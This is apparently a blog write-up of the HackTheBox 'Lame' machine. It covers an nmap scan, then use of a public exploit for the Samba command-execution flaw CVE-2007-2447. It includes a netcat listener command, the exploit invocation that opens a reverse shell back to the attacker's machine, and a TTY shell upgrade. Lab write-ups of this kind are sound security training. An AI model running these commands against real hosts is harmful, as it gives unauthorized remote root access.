---
title: "Lame"
date: 2024-09-02
draft: false
summary: "Writeup for Lame HackTheBox challenge."
tags: ["linux", "rce", "smb"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/lame/cover.webp"
  caption: "Lame HackTheBox Challenge"
  alt: "Lame cover"
platform: "HackTheBox"
---

Lame is a beginner level machine, requiring only one exploit to obtain root access. It contains 2 flags - `user.txt` and `root.txt`
<!--more-->
To access the machine, click on the link given below:
- https://www.hackthebox.com/machines/lame

## Reconnaissance

I started by performing a service version and default script scan on the target using **nmap**.

```shell
nmap TARGET -oN lame.nmap -sV -sC
```

| **Port** | **Service** |
| -------- | ----------- |
| 21       | FTP         |
| 22       | SSH         |
| 139      | smb         |
| 445      | smb         |

![](https://cdn.ziomsec.com/lame/1.webp)
![](https://cdn.ziomsec.com/lame/2.webp)

## Initial Foothold

I searched for exploits related to the FTP version found using **nmap** but did not find anything useful. I then switched to looking for exploits related to the **SMB** version and found a command execution CVE.

![](https://cdn.ziomsec.com/lame/3.webp)

Hence, I looked for ways to exploit the CVE and found a tool on GitHub: 
- https://github.com/amriunix/CVE-2007-2447

I downloaded the script and ran it against the target to get a reverse shell:

![](https://cdn.ziomsec.com/lame/4.webp)

```bash
rlwrap nc -lnvp 8080
```

```shell
python usermap_script.py TARGET 139 KALI 8080
```

![](https://cdn.ziomsec.com/lame/5.webp)

![](https://cdn.ziomsec.com/lame/6.webp)

I directly got **root** access ! I then spawned a **TTY** shell for better usability.

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](https://cdn.ziomsec.com/lame/7.webp)

Finally, I looked into the directories in */home* and found the user flag in */home/makis*.

![](https://cdn.ziomsec.com/lame/8.webp)

Since I was a root user, I also captured the root flag from */root*

![](https://cdn.ziomsec.com/lame/9.webp)

## Closure

Here's how I pwned the machine:
- exploited the vulnerable SMB version and got root shell.
- Captured the user flag from */home/makis*.
- Captured the root flag from */root*.

That's it from my side :) Happy hacking!

---
